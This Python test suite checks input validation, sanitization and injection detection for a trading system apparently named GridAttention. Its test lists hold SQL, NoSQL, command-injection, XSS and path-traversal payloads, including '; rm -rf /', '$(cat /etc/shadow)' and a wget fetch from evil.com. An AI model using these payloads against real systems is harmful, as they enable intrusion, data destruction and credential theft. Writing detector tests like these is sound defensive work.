"""
Input Validation Security Testing Suite for GridAttention Trading System
Tests input sanitization, injection prevention, data validation, and boundary checks
"""

import pytest
import asyncio
import json
import re
from decimal import Decimal
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Union
from unittest.mock import Mock, AsyncMock, patch
import logging
from dataclasses import dataclass
import numpy as np
import pandas as pd

# GridAttention imports - aligned with system structure
from src.grid_attention_layer import GridAttentionLayer
from src.validators.input_validator import InputValidator
from src.validators.trade_validator import TradeValidator
from src.validators.api_validator import APIValidator
from src.validators.data_validator import DataValidator
from src.security.sanitizer import InputSanitizer
from src.security.injection_detector import InjectionDetector

# Test utilities
from tests.utils.test_helpers import async_test, create_test_config
from tests.utils.security_helpers import (
    generate_malicious_inputs,
    generate_boundary_values,
    generate_injection_payloads
)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class TestBasicInputValidation:
    """Test basic input validation functionality"""
    
    @pytest.fixture
    def input_validator(self):
        """Create input validator"""
        config = create_test_config()
        config['validation'] = {
            'strict_mode': True,
            'max_string_length': 1000,
            'max_array_size': 100,
            'max_json_depth': 10,
            'allow_unicode': True,
            'reject_null_bytes': True
        }
        return InputValidator(config)
    
    @async_test
    async def test_string_validation(self, input_validator):
        """Test string input validation"""
        # Valid strings
        valid_strings = [
            "normal_string",
            "String with spaces",
            "Unicode: 你好世界",
            "Special chars: !@#$%",
            "a" * 999  # Just under max length
        ]
        
        for string in valid_strings:
            result = await input_validator.validate_string(
                string, 
                field_name="test_field"
            )
            assert result['valid'] is True, f"Failed to validate: {string}"
        
        # Invalid strings
        invalid_strings = [
            "",  # Empty string
            "a" * 1001,  # Too long
            "string\x00with\x00nulls",  # Null bytes
            "\x00\x01\x02\x03",  # Binary data
            "string\nwith\nnewlines\r\n"  # Newlines (if not allowed)
        ]
        
        for string in invalid_strings:
            result = await input_validator.validate_string(
                string,
                field_name="test_field",
                allow_empty=False
            )
            assert result['valid'] is False, f"Should reject: {repr(string)}"
            assert 'error' in result
    
    @async_test
    async def test_numeric_validation(self, input_validator):
        """Test numeric input validation"""
        # Integer validation
        int_tests = [
            (42, True),
            (-42, True),
            (0, True),
            (2**31 - 1, True),  # Max 32-bit int
            (2**31, False),  # Overflow
            ("42", False),  # String
            (42.5, False),  # Float
            (None, False),  # None
        ]
        
        for value, expected in int_tests:
            result = await input_validator.validate_integer(
                value,
                field_name="test_int",
                min_value=-2**31,
                max_value=2**31 - 1
            )
            assert result['valid'] == expected, f"Integer validation failed for {value}"
        
        # Float validation
        float_tests = [
            (42.5, True),
            (-42.5, True),
            (0.0, True),
            (float('inf'), False),  # Infinity
            (float('-inf'), False),  # Negative infinity
            (float('nan'), False),  # NaN
            ("42.5", False),  # String
        ]
        
        for value, expected in float_tests:
            result = await input_validator.validate_float(
                value,
                field_name="test_float",
                allow_infinity=False,
                allow_nan=False
            )
            assert result['valid'] == expected, f"Float validation failed for {value}"
    
    @async_test
    async def test_array_validation(self, input_validator):
        """Test array input validation"""
        # Valid arrays
        valid_arrays = [
            [1, 2, 3],
            ["a", "b", "c"],
            [],  # Empty array
            list(range(100)),  # Max size
        ]
        
        for array in valid_arrays:
            result = await input_validator.validate_array(
                array,
                field_name="test_array",
                allow_empty=True
            )
            assert result['valid'] is True
        
        # Invalid arrays
        invalid_arrays = [
            list(range(101)),  # Too large
            [1, "2", 3],  # Mixed types
            {"not": "array"},  # Not an array
            None,  # None
        ]
        
        for array in invalid_arrays:
            result = await input_validator.validate_array(
                array,
                field_name="test_array",
                element_type=int
            )
            assert result['valid'] is False
    
    @async_test
    async def test_json_validation(self, input_validator):
        """Test JSON input validation"""
        # Valid JSON
        valid_json = [
            {"key": "value"},
            {"nested": {"key": "value"}},
            {"array": [1, 2, 3]},
            {"mixed": {"num": 42, "str": "test", "bool": True}},
        ]
        
        for json_data in valid_json:
            result = await input_validator.validate_json(
                json.dumps(json_data),
                field_name="test_json"
            )
            assert result['valid'] is True
        
        # Invalid JSON
        invalid_json = [
            "{invalid json}",  # Malformed
            '{"key": undefined}',  # Invalid value
            '{"a":' * 11 + '1' + '}' * 11,  # Too deeply nested
            '{"key": "\x00value"}',  # Null bytes
        ]
        
        for json_str in invalid_json:
            result = await input_validator.validate_json(
                json_str,
                field_name="test_json"
            )
            assert result['valid'] is False


class TestTradeInputValidation:
    """Test trading-specific input validation"""
    
    @pytest.fixture
    def trade_validator(self):
        """Create trade validator"""
        config = create_test_config()
        config['trading'] = {
            'min_order_size': 0.001,
            'max_order_size': 10000,
            'min_price': 0.01,
            'max_price': 1000000,
            'max_slippage': 0.05,  # 5%
            'allowed_order_types': ['market', 'limit', 'stop', 'stop_limit'],
            'allowed_time_in_force': ['GTC', 'IOC', 'FOK', 'GTD']
        }
        return TradeValidator(config)
    
    @async_test
    async def test_order_validation(self, trade_validator):
        """Test order input validation"""
        # Valid order
        valid_order = {
            'symbol': 'BTC/USDT',
            'side': 'buy',
            'type': 'limit',
            'quantity': 0.1,
            'price': 50000,
            'time_in_force': 'GTC'
        }
        
        result = await trade_validator.validate_order(valid_order)
        assert result['valid'] is True
        
        # Test various invalid orders
        invalid_orders = [
            # Invalid symbol
            {**valid_order, 'symbol': 'INVALID SYMBOL'},
            {**valid_order, 'symbol': '../../../etc/passwd'},  # Path traversal
            {**valid_order, 'symbol': 'BTC/USDT; DROP TABLE orders;--'},  # SQL injection
            
            # Invalid side
            {**valid_order, 'side': 'invalid'},
            {**valid_order, 'side': ''},
            
            # Invalid quantity
            {**valid_order, 'quantity': 0},  # Too small
            {**valid_order, 'quantity': 100000},  # Too large
            {**valid_order, 'quantity': -1},  # Negative
            {**valid_order, 'quantity': 'abc'},  # Non-numeric
            
            # Invalid price
            {**valid_order, 'price': 0},  # Zero price
            {**valid_order, 'price': -1000},  # Negative
            {**valid_order, 'price': float('inf')},  # Infinity
            {**valid_order, 'price': 10000000},  # Too high
            
            # Invalid type
            {**valid_order, 'type': 'invalid_type'},
            {**valid_order, 'type': 'limit; DELETE FROM orders;'},
        ]
        
        for order in invalid_orders:
            result = await trade_validator.validate_order(order)
            assert result['valid'] is False, f"Should reject order: {order}"
            assert 'error' in result
            logger.info(f"Rejected: {result['error']}")
    
    @async_test
    async def test_price_validation(self, trade_validator):
        """Test price input validation with precision"""
        # Test decimal precision
        price_tests = [
            (Decimal("50000.00"), True),  # Valid decimal
            (Decimal("50000.12345678"), True),  # Valid precision
            (Decimal("50000.123456789"), False),  # Too many decimals
            (50000, True),  # Integer
            (50000.0, True),  # Float
            ("50000", False),  # String
            (Decimal("0.00000001"), False),  # Too small
        ]
        
        for price, expected in price_tests:
            result = await trade_validator.validate_price(
                price,
                symbol='BTC/USDT',
                max_decimals=8
            )
            assert result['valid'] == expected, f"Price validation failed for {price}"
    
    @async_test
    async def test_trading_pair_validation(self, trade_validator):
        """Test trading pair symbol validation"""
        # Valid symbols
        valid_symbols = [
            'BTC/USDT',
            'ETH/BTC',
            'BNB/USDT',
            'ADA/BUSD',
            'DOT/ETH'
        ]
        
        for symbol in valid_symbols:
            result = await trade_validator.validate_symbol(symbol)
            assert result['valid'] is True
        
        # Invalid symbols
        invalid_symbols = [
            'INVALID',  # No separator
            'BTC-USDT',  # Wrong separator
            'BTC/USDT/ETH',  # Too many parts
            'BTC/',  # Missing quote
            '/USDT',  # Missing base
            'btc/usdt',  # Lowercase (if not allowed)
            'BTC/USDT ',  # Trailing space
            ' BTC/USDT',  # Leading space
            'BTC\x00/USDT',  # Null byte
            '../../etc/passwd',  # Path traversal
            'BTC/USDT; DROP TABLE--',  # SQL injection
        ]
        
        for symbol in invalid_symbols:
            result = await trade_validator.validate_symbol(symbol)
            assert result['valid'] is False, f"Should reject symbol: {symbol}"
    
    @async_test
    async def test_stop_loss_take_profit_validation(self, trade_validator):
        """Test stop loss and take profit validation"""
        current_price = 50000
        
        # Test stop loss validation
        sl_tests = [
            # (side, stop_loss, current_price, expected_valid)
            ('buy', 49000, current_price, True),  # Valid SL below for buy
            ('buy', 51000, current_price, False),  # Invalid SL above for buy
            ('sell', 51000, current_price, True),  # Valid SL above for sell
            ('sell', 49000, current_price, False),  # Invalid SL below for sell
        ]
        
        for side, sl_price, current, expected in sl_tests:
            result = await trade_validator.validate_stop_loss(
                side=side,
                stop_loss=sl_price,
                current_price=current
            )
            assert result['valid'] == expected, \
                f"SL validation failed: side={side}, sl={sl_price}, current={current}"
        
        # Test take profit validation
        tp_tests = [
            # (side, take_profit, current_price, expected_valid)
            ('buy', 51000, current_price, True),  # Valid TP above for buy
            ('buy', 49000, current_price, False),  # Invalid TP below for buy
            ('sell', 49000, current_price, True),  # Valid TP below for sell
            ('sell', 51000, current_price, False),  # Invalid TP above for sell
        ]
        
        for side, tp_price, current, expected in tp_tests:
            result = await trade_validator.validate_take_profit(
                side=side,
                take_profit=tp_price,
                current_price=current
            )
            assert result['valid'] == expected, \
                f"TP validation failed: side={side}, tp={tp_price}, current={current}"


class TestAPIInputValidation:
    """Test API request input validation"""
    
    @pytest.fixture
    def api_validator(self):
        """Create API validator"""
        config = create_test_config()
        config['api'] = {
            'max_request_size': 1024 * 1024,  # 1MB
            'max_url_length': 2048,
            'max_header_size': 8192,
            'allowed_methods': ['GET', 'POST', 'PUT', 'DELETE'],
            'rate_limit_per_minute': 60
        }
        return APIValidator(config)
    
    @async_test
    async def test_request_method_validation(self, api_validator):
        """Test HTTP method validation"""
        # Valid methods
        valid_methods = ['GET', 'POST', 'PUT', 'DELETE']
        
        for method in valid_methods:
            result = await api_validator.validate_method(method)
            assert result['valid'] is True
        
        # Invalid methods
        invalid_methods = [
            'TRACE',  # Security risk
            'CONNECT',  # Not allowed
            'get',  # Wrong case
            'POST ',  # Trailing space
            '',  # Empty
            'GET\x00',  # Null byte
            'GET; cat /etc/passwd',  # Command injection
        ]
        
        for method in invalid_methods:
            result = await api_validator.validate_method(method)
            assert result['valid'] is False
    
    @async_test
    async def test_url_validation(self, api_validator):
        """Test URL validation"""
        # Valid URLs
        valid_urls = [
            '/api/v1/orders',
            '/api/v1/orders/123',
            '/api/v1/orders?symbol=BTC/USDT&side=buy',
            '/api/v1/account/balance',
        ]
        
        for url in valid_urls:
            result = await api_validator.validate_url(url)
            assert result['valid'] is True
        
        # Invalid URLs
        invalid_urls = [
            '../../../etc/passwd',  # Path traversal
            '/api/v1/orders?id=1; DROP TABLE orders;--',  # SQL injection
            '/api/v1/orders?<script>alert(1)</script>',  # XSS
            '/api/v1/' + 'a' * 2048,  # Too long
            '/api/v1/orders\x00',  # Null byte
            'http://evil.com/redirect',  # Full URL (not allowed)
            '/api/v1/orders?id=1&id=2&id=3' + '&id=4' * 100,  # Parameter pollution
        ]
        
        for url in invalid_urls:
            result = await api_validator.validate_url(url)
            assert result['valid'] is False, f"Should reject URL: {url}"
    
    @async_test
    async def test_header_validation(self, api_validator):
        """Test HTTP header validation"""
        # Valid headers
        valid_headers = {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9',
            'X-API-Key': 'abc123def456',
            'User-Agent': 'GridAttention/1.0'
        }
        
        result = await api_validator.validate_headers(valid_headers)
        assert result['valid'] is True
        
        # Invalid headers
        invalid_header_sets = [
            # Header injection
            {'Evil': 'value\r\nX-Injected: true'},
            
            # Null bytes
            {'Header': 'value\x00'},
            
            # Too large
            {'Large': 'x' * 8193},
            
            # Invalid characters
            {'Invalid\nHeader': 'value'},
            
            # XSS attempt
            {'Referer': '<script>alert(1)</script>'},
        ]
        
        for headers in invalid_header_sets:
            result = await api_validator.validate_headers(headers)
            assert result['valid'] is False
    
    @async_test
    async def test_query_parameter_validation(self, api_validator):
        """Test query parameter validation"""
        # Valid parameters
        valid_params = {
            'symbol': 'BTC/USDT',
            'limit': '100',
            'offset': '0',
            'start_time': '1234567890',
            'order_by': 'created_at'
        }
        
        result = await api_validator.validate_query_params(valid_params)
        assert result['valid'] is True
        
        # Invalid parameters
        invalid_param_sets = [
            # SQL injection
            {'symbol': "BTC'; DROP TABLE orders;--"},
            
            # XSS
            {'callback': '<script>alert(1)</script>'},
            
            # Command injection
            {'file': '../../etc/passwd'},
            
            # Parameter pollution
            {'id': ['1', '2', '3'] * 50},  # Too many values
            
            # Invalid types
            {'limit': 'abc'},  # Should be numeric
            {'offset': '-1'},  # Negative offset
        ]
        
        for params in invalid_param_sets:
            result = await api_validator.validate_query_params(params)
            assert result['valid'] is False


class TestInjectionPrevention:
    """Test injection attack prevention"""
    
    @pytest.fixture
    def injection_detector(self):
        """Create injection detector"""
        config = create_test_config()
        return InjectionDetector(config)
    
    @async_test
    async def test_sql_injection_detection(self, injection_detector):
        """Test SQL injection detection"""
        # Common SQL injection patterns
        sql_injections = [
            "1' OR '1'='1",
            "1'; DROP TABLE users;--",
            "1' UNION SELECT * FROM passwords--",
            "admin'--",
            "1' AND 1=1--",
            "1' OR 1=1#",
            "1' OR 'a'='a",
            "'; EXEC xp_cmdshell('dir');--",
            "1' AND (SELECT * FROM users) = '",
            "1' AND SLEEP(5)--",
        ]
        
        for payload in sql_injections:
            result = await injection_detector.detect_sql_injection(payload)
            assert result['detected'] is True, f"Failed to detect SQL injection: {payload}"
            assert 'pattern' in result
            logger.info(f"Detected SQL injection: {payload} - Pattern: {result['pattern']}")
    
    @async_test
    async def test_nosql_injection_detection(self, injection_detector):
        """Test NoSQL injection detection"""
        # MongoDB injection patterns
        nosql_injections = [
            '{"$ne": null}',
            '{"$gt": ""}',
            '{"$where": "this.password == \'pass\'"}',
            '{"username": {"$regex": ".*"}}',
            '{"$or": [{"a": "1"}, {"b": "2"}]}',
            '{"age": {"$gte": "0"}}',
        ]
        
        for payload in nosql_injections:
            result = await injection_detector.detect_nosql_injection(payload)
            assert result['detected'] is True, f"Failed to detect NoSQL injection: {payload}"
    
    @async_test
    async def test_command_injection_detection(self, injection_detector):
        """Test command injection detection"""
        # Command injection patterns
        cmd_injections = [
            "; cat /etc/passwd",
            "| ls -la",
            "& dir",
            "`whoami`",
            "$(cat /etc/shadow)",
            "; rm -rf /",
            "|| ping -c 10 127.0.0.1",
            "; wget http://evil.com/malware.sh",
            "'; exec('cmd.exe');",
        ]
        
        for payload in cmd_injections:
            result = await injection_detector.detect_command_injection(payload)
            assert result['detected'] is True, f"Failed to detect command injection: {payload}"
    
    @async_test
    async def test_xss_detection(self, injection_detector):
        """Test XSS detection"""
        # XSS patterns
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "<iframe src='javascript:alert(1)'>",
            "<body onload=alert(1)>",
            "';alert(1);//",
            "<script>document.cookie</script>",
            "<img src=\"x\" onerror=\"alert(1)\">",
            "<%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
        ]
        
        for payload in xss_payloads:
            result = await injection_detector.detect_xss(payload)
            assert result['detected'] is True, f"Failed to detect XSS: {payload}"
    
    @async_test
    async def test_path_traversal_detection(self, injection_detector):
        """Test path traversal detection"""
        # Path traversal patterns
        path_traversals = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/var/www/../../etc/passwd",
            "C:\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        ]
        
        for payload in path_traversals:
            result = await injection_detector.detect_path_traversal(payload)
            assert result['detected'] is True, f"Failed to detect path traversal: {payload}"


class TestDataSanitization:
    """Test data sanitization"""
    
    @pytest.fixture
    def sanitizer(self):
        """Create input sanitizer"""
        config = create_test_config()
        return InputSanitizer(config)
    
    @async_test
    async def test_html_sanitization(self, sanitizer):
        """Test HTML content sanitization"""
        # Test HTML sanitization
        html_tests = [
            # (input, expected_output)
            ("<script>alert(1)</script>", ""),
            ("<p>Hello <b>World</b></p>", "<p>Hello <b>World</b></p>"),
            ("<img src=x onerror=alert(1)>", "<img src='x'>"),
            ("Hello & Goodbye", "Hello &amp; Goodbye"),
            ("<a href='javascript:alert(1)'>Click</a>", "<a>Click</a>"),
        ]
        
        for input_html, expected in html_tests:
            result = await sanitizer.sanitize_html(input_html)
            assert result['sanitized'] == expected, \
                f"HTML sanitization failed: {input_html} -> {result['sanitized']}"
    
    @async_test
    async def test_filename_sanitization(self, sanitizer):
        """Test filename sanitization"""
        # Test filename sanitization
        filename_tests = [
            ("normal_file.txt", "normal_file.txt"),
            ("../../../etc/passwd", "etc_passwd"),
            ("file\x00name.txt", "filename.txt"),
            ("file<script>.txt", "filescript.txt"),
            ("COM1", "COM1_"),  # Reserved Windows name
            ("file|name?.txt", "filename.txt"),
            (".hidden_file", "hidden_file"),  # Remove leading dot
        ]
        
        for input_name, expected in filename_tests:
            result = await sanitizer.sanitize_filename(input_name)
            assert result['sanitized'] == expected, \
                f"Filename sanitization failed: {input_name} -> {result['sanitized']}"
    
    @async_test
    async def test_json_sanitization(self, sanitizer):
        """Test JSON data sanitization"""
        # Test JSON sanitization
        json_data = {
            "name": "User<script>alert(1)</script>",
            "email": "user@example.com\x00",
            "bio": "Hello\r\nWorld",
            "website": "javascript:alert(1)",
            "age": "25",  # Should convert to int
            "balance": "100.50",  # Should convert to float
        }
        
        result = await sanitizer.sanitize_json(json_data)
        sanitized = result['sanitized']
        
        assert "<script>" not in sanitized['name']
        assert "\x00" not in sanitized['email']
        assert "javascript:" not in sanitized['website']
        assert isinstance(sanitized['age'], int)
        assert isinstance(sanitized['balance'], float)


class TestBoundaryValidation:
    """Test boundary value validation"""
    
    @pytest.fixture
    def data_validator(self):
        """Create data validator"""
        config = create_test_config()
        return DataValidator(config)
    
    @async_test
    async def test_numeric_boundaries(self, data_validator):
        """Test numeric boundary validation"""
        # Test integer boundaries
        int_boundaries = [
            ('int8', -128, 127),
            ('int16', -32768, 32767),
            ('int32', -2147483648, 2147483647),
            ('uint8', 0, 255),
            ('uint16', 0, 65535),
            ('uint32', 0, 4294967295),
        ]
        
        for type_name, min_val, max_val in int_boundaries:
            # Test valid boundaries
            assert await data_validator.validate_integer(min_val, type_name=type_name)
            assert await data_validator.validate_integer(max_val, type_name=type_name)
            
            # Test invalid boundaries
            assert not await data_validator.validate_integer(min_val - 1, type_name=type_name)
            assert not await data_validator.validate_integer(max_val + 1, type_name=type_name)
    
    @async_test
    async def test_string_length_boundaries(self, data_validator):
        """Test string length boundary validation"""
        # Test various string length limits
        length_tests = [
            ('username', 3, 20),
            ('password', 8, 128),
            ('email', 5, 254),
            ('description', 0, 1000),
            ('tweet', 1, 280),
        ]
        
        for field, min_len, max_len in length_tests:
            # Valid lengths
            if min_len > 0:
                assert await data_validator.validate_string_length(
                    'a' * min_len, field, min_len, max_len
                )
            assert await data_validator.validate_string_length(
                'a' * max_len, field, min_len, max_len
            )
            
            # Invalid lengths
            if min_len > 0:
                assert not await data_validator.validate_string_length(
                    'a' * (min_len - 1), field, min_len, max_len
                )
            assert not await data_validator.validate_string_length(
                'a' * (max_len + 1), field, min_len, max_len
            )
    
    @async_test
    async def test_array_size_boundaries(self, data_validator):
        """Test array size boundary validation"""
        # Test array size limits
        size_tests = [
            ('tags', 0, 10),
            ('items', 1, 100),
            ('batch', 1, 1000),
        ]
        
        for field, min_size, max_size in size_tests:
            # Valid sizes
            if min_size == 0:
                assert await data_validator.validate_array_size([], field, min_size, max_size)
            assert await data_validator.validate_array_size(
                [1] * max_size, field, min_size, max_size
            )
            
            # Invalid sizes
            if min_size > 0:
                assert not await data_validator.validate_array_size(
                    [], field, min_size, max_size
                )
            assert not await data_validator.validate_array_size(
                [1] * (max_size + 1), field, min_size, max_size
            )


class TestComplexValidation:
    """Test complex validation scenarios"""
    
    @async_test
    async def test_nested_object_validation(self, input_validator):
        """Test validation of nested objects"""
        # Valid nested object
        valid_order = {
            'id': 'ORD123',
            'user': {
                'id': 'USER456',
                'name': 'John Doe',
                'email': 'john@example.com'
            },
            'items': [
                {'product_id': 'PROD1', 'quantity': 2, 'price': 99.99},
                {'product_id': 'PROD2', 'quantity': 1, 'price': 49.99}
            ],
            'shipping': {
                'address': {
                    'street': '123 Main St',
                    'city': 'New York',
                    'zip': '10001'
                },
                'method': 'express'
            }
        }
        
        schema = {
            'id': {'type': 'string', 'pattern': r'^ORD\d+$'},
            'user': {
                'type': 'object',
                'properties': {
                    'id': {'type': 'string'},
                    'name': {'type': 'string', 'min_length': 1},
                    'email': {'type': 'email'}
                }
            },
            'items': {
                'type': 'array',
                'min_items': 1,
                'items': {
                    'type': 'object',
                    'properties': {
                        'product_id': {'type': 'string'},
                        'quantity': {'type': 'integer', 'min': 1},
                        'price': {'type': 'float', 'min': 0}
                    }
                }
            }
        }
        
        result = await input_validator.validate_schema(valid_order, schema)
        assert result['valid'] is True
    
    @async_test
    async def test_conditional_validation(self, trade_validator):
        """Test conditional validation rules"""
        # Market order shouldn't have price
        market_order = {
            'symbol': 'BTC/USDT',
            'side': 'buy',
            'type': 'market',
            'quantity': 0.1,
            'price': 50000  # Should be rejected for market order
        }
        
        result = await trade_validator.validate_order(market_order)
        assert result['valid'] is False
        assert 'price not allowed for market orders' in result['error'].lower()
        
        # Limit order must have price
        limit_order = {
            'symbol': 'BTC/USDT',
            'side': 'buy',
            'type': 'limit',
            'quantity': 0.1
            # Missing price
        }
        
        result = await trade_validator.validate_order(limit_order)
        assert result['valid'] is False
        assert 'price required for limit orders' in result['error'].lower()
    
    @async_test
    async def test_cross_field_validation(self, trade_validator):
        """Test validation across multiple fields"""
        # Stop limit order validation
        stop_limit_order = {
            'symbol': 'BTC/USDT',
            'side': 'buy',
            'type': 'stop_limit',
            'quantity': 0.1,
            'price': 51000,  # Limit price
            'stop_price': 50500,  # Stop trigger price
        }
        
        # For buy stop limit, stop price should be above current price
        # and limit price should be above stop price
        current_price = 50000
        
        result = await trade_validator.validate_stop_limit_order(
            stop_limit_order,
            current_price=current_price
        )
        assert result['valid'] is True
        
        # Invalid: limit price below stop price
        invalid_order = {
            **stop_limit_order,
            'price': 50000,  # Below stop price
            'stop_price': 50500
        }
        
        result = await trade_validator.validate_stop_limit_order(
            invalid_order,
            current_price=current_price
        )
        assert result['valid'] is False
        assert 'limit price must be above stop price' in result['error'].lower()


class TestValidationPerformance:
    """Test validation performance and optimization"""
    
    @async_test
    async def test_bulk_validation_performance(self, input_validator):
        """Test performance of bulk validation"""
        # Generate large dataset
        orders = []
        for i in range(1000):
            orders.append({
                'id': f'ORD{i}',
                'symbol': 'BTC/USDT',
                'quantity': 0.1 + i * 0.001,
                'price': 50000 + i
            })
        
        # Measure validation time
        start_time = time.time()
        
        results = await input_validator.validate_bulk(orders)
        
        end_time = time.time()
        duration = end_time - start_time
        
        # Should validate 1000 orders in under 1 second
        assert duration < 1.0, f"Bulk validation too slow: {duration:.2f}s"
        
        # All should be valid
        assert all(r['valid'] for r in results)
        
        logger.info(f"Validated {len(orders)} orders in {duration:.3f}s")
    
    @async_test
    async def test_validation_caching(self, input_validator):
        """Test validation result caching"""
        # Enable caching
        input_validator.enable_cache()
        
        # First validation (cache miss)
        data = {'symbol': 'BTC/USDT', 'quantity': 0.1}
        
        start_time = time.time()
        result1 = await input_validator.validate_with_cache(data)
        first_duration = time.time() - start_time
        
        # Second validation (cache hit)
        start_time = time.time()
        result2 = await input_validator.validate_with_cache(data)
        second_duration = time.time() - start_time
        
        # Cache hit should be much faster
        assert second_duration < first_duration * 0.1
        assert result1 == result2
        
        logger.info(f"First validation: {first_duration:.3f}s")
        logger.info(f"Cached validation: {second_duration:.3f}s")


# Helper function for testing
async def generate_fuzz_inputs(count: int = 100) -> List[Any]:
    """Generate random fuzzing inputs"""
    import random
    import string
    
    fuzz_inputs = []
    
    for _ in range(count):
        input_type = random.choice(['string', 'number', 'array', 'object', 'special'])
        
        if input_type == 'string':
            # Random strings with various characters
            length = random.randint(0, 1000)
            chars = string.printable + '\x00\x01\x02\x03\x04\x05'
            fuzz_inputs.append(''.join(random.choice(chars) for _ in range(length)))
            
        elif input_type == 'number':
            # Random numbers including edge cases
            fuzz_inputs.append(random.choice([
                random.randint(-2**31, 2**31),
                random.random() * 1e10,
                float('inf'),
                float('-inf'),
                float('nan'),
                0,
                -0,
                2**53,  # JavaScript MAX_SAFE_INTEGER + 1
            ]))
            
        elif input_type == 'array':
            # Random arrays
            size = random.randint(0, 100)
            fuzz_inputs.append([random.randint(0, 100) for _ in range(size)])
            
        elif input_type == 'object':
            # Random objects
            obj = {}
            for _ in range(random.randint(0, 10)):
                key = ''.join(random.choice(string.ascii_letters) for _ in range(10))
                obj[key] = random.choice([None, True, False, random.randint(0, 100)])
            fuzz_inputs.append(obj)
            
        else:
            # Special values
            fuzz_inputs.append(random.choice([
                None,
                undefined := type('undefined', (), {})(),
                [],
                {},
                '',
                False,
                True
            ]))
    
    return fuzz_inputs